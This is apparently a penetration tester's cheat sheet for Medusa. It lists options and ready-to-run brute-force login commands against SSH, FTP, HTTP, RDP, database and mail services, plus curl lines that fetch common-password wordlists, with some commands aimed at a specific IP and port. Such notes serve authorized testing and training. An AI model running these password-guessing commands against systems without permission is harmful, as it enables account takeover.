---
created: 2025-09-03
---
## Medusa

>**[Medusa](https://www.kali.org/tools/medusa/)** is a fast login brute-force tool with support for a wide range of services and massive parallelism.

```bash
medusa [TARGET_OPTIONS] [CREDENTIAL_OPTIONS] -M module -m "[MODULE_OPTIONS]"
```

| Option                           | Description                                                                             |
| -------------------------------- | --------------------------------------------------------------------------------------- |
| `-h HOST`<br>or<br>`-H FILE`     | Specifies a target host (`-h`) or a file with a list of target hosts.                   |
| `-u USERNAME`<br>or<br>`-U FILE` | Specifies a single username (`-u`) or a file with a list of usernames (`-U`) to try.    |
| `-p PASSWORD`<br>or<br>`-P FILE` | Specifies a single password (`-p`) or a file with a list of passwords (`-P`) to try.    |
| `-M MODULE`                      | Specifies the specific module to use for the attack (e.g., `ssh`, `ftp`, `http`, etc.). |
| `-m "MODULE_OPTION"`             | Provides additional parameters required by the chosen module (enclosed in quotes).      |
| `-t THREADS`                     | Defines the number of parallel threads to run (default `16`).                           |
| `-f`                             | Stop scanning after first valid username/password found.                                |
| `-F`                             | Stop audit after first valid username/password found on any host.                       |
| `-n PORT`                        | Specifies a non-default port for the target service.                                    |
| `-v LEVEL`                       | Verbose level (`0`-`6`); the default level is `5`                                       |

## Medusa modules

Each module in Medusa is tailored to interact with specific authentication mechanisms.

### SSH


```bash
medusa -M ssh -h 192.168.1.11 -u root -P passwords.txt
```
### FTP

```bash
medusa -M ftp -h 192.168.1.11 -u admin -P passwords.txt
```

- To additionally check for empty passwords (`-e n`) and passwords matching the username (`-e s`):

```bash
medusa -M ftp -h 192.168.1.11 -u admin -P passwords.txt -e ns
```
### HTTP

```bash
medusa -M http -h www.example.com -U usernames.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^
```

- To target multiple web servers:

```bash
medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET
```

```bash
medusa -h 83.136.250.201 -n 56345 -U usernames.txt -P 2023-200_most_used_passwords.txt -M http -m GET
```

```bash
medusa -h 83.136.250.201 -n 56345 -U usernames.txt -P 10k-most-common.txt -M http -m GET
```

```shell
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
```

```bash
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
```

| Medusa Module    | Description                                                                                 | Usage Example                                                                                                               |
| ---------------- | ------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------- |
| FTP              | Brute-forcing FTP login credentials, used for file transfers over a network.                | `medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt`                                                                  |
| HTTP             | Brute-forcing login forms on web applications over HTTP (`GET`/`POST`).                     | `medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^` |
| IMAP             | Brute-forcing IMAP logins, often used to access email servers.                              | `medusa -M imap -h mail.example.com -U users.txt -P passwords.txt`                                                          |
| MySQL            | Brute-forcing MySQL database credentials, commonly used for web applications and databases. | `medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt`                                                                 |
| POP3             | Brute-forcing POP3 logins, typically used to retrieve emails from a mail server.            | `medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt`                                                          |
| RDP              | Brute-forcing RDP logins, commonly used for remote desktop access to Windows systems.       | `medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt`                                                                  |
| SSHv2            | Brute-forcing SSH logins, commonly used for secure remote access.                           | `medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt`                                                                   |
| Subversion (SVN) | Brute-forcing Subversion (SVN) repositories for version control.                            | `medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt`                                                                  |
| Telnet           | Brute-forcing Telnet services for remote command execution on older systems.                | `medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt`                                                               |
| VNC              | Brute-forcing VNC login credentials for remote desktop access.                              | `medusa -M vnc -h 192.168.1.100 -P passwords.txt`                                                                           |
| Web Form         | Brute-forcing login forms on websites using HTTP POST requests.                             | `medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid"`   |
## References

- https://www.kali.org/tools/medusa/
- https://man.archlinux.org/man/medusa.1.en